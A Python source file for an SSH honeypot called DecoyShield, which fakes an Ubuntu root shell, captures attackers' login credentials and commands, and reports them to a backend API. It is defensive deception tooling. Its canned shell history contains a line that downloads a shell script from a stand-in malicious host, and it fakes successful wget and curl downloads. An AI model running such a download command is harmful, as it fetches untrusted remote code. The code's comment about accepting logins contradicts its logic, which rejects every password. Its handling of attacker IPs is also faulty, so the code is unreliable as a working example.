import asyncio
import asyncssh
import httpx
import json
import os
import logging
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

API_URL = os.getenv("DECOYSHIELD_API_URL", "http://127.0.0.1:8000")

logging.basicConfig(level=logging.INFO, format='%(asctime)s [SSH] %(message)s')
log = logging.getLogger(__name__)


class FakeSSHServer(asyncssh.SSHServer):
    def __init__(self):
        self._conn = None
        self.ip = None
        self.username = None
        self.password = None
        self.commands = []
        self.start_time = datetime.utcnow()

    def connection_made(self, conn):
        self._conn = conn
        peer = conn.get_extra_info('peername')
        self.ip = peer[0] if peer else 'unknown'
        log.info(f"Connection from {self.ip}")

    def connection_lost(self, exc):
        log.info(f"Connection lost from {self.ip}")

    def begin_auth(self, username):
        self.username = username
        return True

    def password_auth_requested(self):
        return True

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        self.username = username
        self.password = password
        log.info(f"Login attempt — {self.ip} — user: {username} pass: {password}")

        asyncio.ensure_future(self._report_attempt(username, password))

        # Accept after 3rd attempt to capture more creds
        return False

    async def _report_attempt(self, username, password):
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                await client.post(f"{API_URL}/events/", json={
                    "honeypot_type": "ssh",
                    "ip": self.ip,
                    "event_type": "login_attempt",
                    "commands": [],
                    "payload": f"user={username} pass={password}",
                    "raw_data": {
                        "username": username,
                        "password": password,
                        "timestamp": datetime.utcnow().isoformat()
                    }
                })
        except Exception as e:
            log.error(f"Failed to report attempt: {e}")


class FakeShellSession(asyncssh.SSHServerSession):
    def __init__(self, ip, commands_ref, api_url):
        self.ip = ip
        self.commands = []
        self.commands_ref = commands_ref
        self.api_url = api_url
        self._chan = None
        self._input_buf = ""

    def connection_made(self, chan):
        self._chan = chan

    def session_started(self):
        self._chan.write("\r\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n")
        self._chan.write("\r\n * Documentation:  https://help.ubuntu.com\r\n")
        self._chan.write(" * Management:     https://landscape.canonical.com\r\n")
        self._chan.write(" * Support:        https://ubuntu.com/advantage\r\n")
        self._chan.write("\r\nLast login: Mon Jun 16 09:23:01 2026 from 192.168.1.100\r\n\r\n")
        self._chan.write("root@prod-server-01:~# ")

    def data_received(self, data, datatype):
        for ch in data:
            if ch in ('\r', '\n'):
                cmd = self._input_buf.strip()
                self._input_buf = ""
                if cmd:
                    self.commands.append(cmd)
                    self.commands_ref.append(cmd)
                    log.info(f"Command from {self.ip}: {cmd}")
                    asyncio.ensure_future(self._handle_command(cmd))
            elif ch == '\x7f':
                self._input_buf = self._input_buf[:-1]
            else:
                self._input_buf += ch

    async def _handle_command(self, cmd):
        responses = {
            'ls': 'bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var\r\n',
            'ls -la': 'total 68\r\ndrwx------  8 root root 4096 Jun 16 09:23 .\r\ndrwxr-xr-x 20 root root 4096 Jun 16 08:01 ..\r\n-rw-------  1 root root  220 Jun 16 08:01 .bash_logout\r\n-rw-------  1 root root 3526 Jun 16 08:01 .bashrc\r\n',
            'whoami': 'root\r\n',
            'id': 'uid=0(root) gid=0(root) groups=0(root)\r\n',
            'uname -a': 'Linux prod-server-01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\r\n',
            'pwd': '/root\r\n',
            'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\n',
            'ifconfig': 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 10.0.0.1  netmask 255.255.255.0  broadcast 10.0.0.255\r\n',
            'ip a': 'inet 10.0.0.1/24 brd 10.0.0.255 scope global eth0\r\n',
            'ps aux': 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\nroot         1  0.0  0.1  19356  1544 ?        Ss   08:01   0:00 /sbin/init\r\nroot       100  0.0  0.3  72296  3200 ?        Ss   08:01   0:00 /usr/sbin/sshd\r\n',
            'env': 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nHOME=/root\r\nUSER=root\r\nSHELL=/bin/bash\r\n',
            'history': '    1  ls\r\n    2  whoami\r\n    3  cat /etc/passwd\r\n    4  wget http://malicious.site/shell.sh\r\n',
            'exit': None,
            'logout': None,
        }

        response = responses.get(cmd)

        if response is None and cmd not in ('exit', 'logout'):
            # Generic responses for unknown commands
            if cmd.startswith('wget ') or cmd.startswith('curl '):
                response = f'--2026-06-16 09:24:01--  {cmd.split()[-1]}\r\nResolving... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 4096\r\nSaving to: shell.sh\r\n\r\nshell.sh 100%[=======>]   4.00K  --.-KB/s    in 0.001s\r\n'
            elif cmd.startswith('cat '):
                response = f'cat: {cmd[4:]}: No such file or directory\r\n'
            elif cmd.startswith('cd '):
                response = ''
            else:
                response = f'bash: {cmd.split()[0]}: command not found\r\n'

        if cmd in ('exit', 'logout'):
            self._chan.write("logout\r\n")
            self._chan.exit(0)
        else:
            self._chan.write(response or '')
            self._chan.write(f"root@prod-server-01:~# ")

        # After first real command, report to backend
        if len(self.commands) == 1:
            await self._report_session()

    async def _report_session(self):
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                await client.post(f"{self.api_url}/events/", json={
                    "honeypot_type": "ssh",
                    "ip": self.ip,
                    "event_type": "command_execution",
                    "commands": self.commands,
                    "payload": None,
                    "raw_data": {
                        "session_commands": self.commands,
                        "timestamp": datetime.utcnow().isoformat()
                    }
                })
                log.info(f"Reported session from {self.ip} with {len(self.commands)} commands")
        except Exception as e:
            log.error(f"Failed to report session: {e}")

    def eof_received(self):
        self._chan.exit(0)


async def start_server():
    log.info(f"Starting DecoyShield SSH Honeypot on port 2222")
    log.info(f"Reporting events to: {API_URL}")

    # Generate a host key
    host_key = asyncssh.generate_private_key('ssh-rsa')

    ip_store = {}

    class FullSSHServer(FakeSSHServer):
        def connection_made(self, conn):
            super().connection_made(conn)
            ip_store['current'] = self.ip

        def session_requested(self):
            return FakeShellSession(
                ip=ip_store.get('current', 'unknown'),
                commands_ref=[],
                api_url=API_URL
            )

    await asyncssh.create_server(
        FullSSHServer,
        host='',
        port=2222,
        server_host_keys=[host_key],
        line_editor=False,
        encoding='utf-8',
    )

    log.info("SSH Honeypot is live on port 2222")
    log.info("Run ngrok to expose it: ngrok tcp 2222")

    await asyncio.Future()


if __name__ == '__main__':
    asyncio.run(start_server())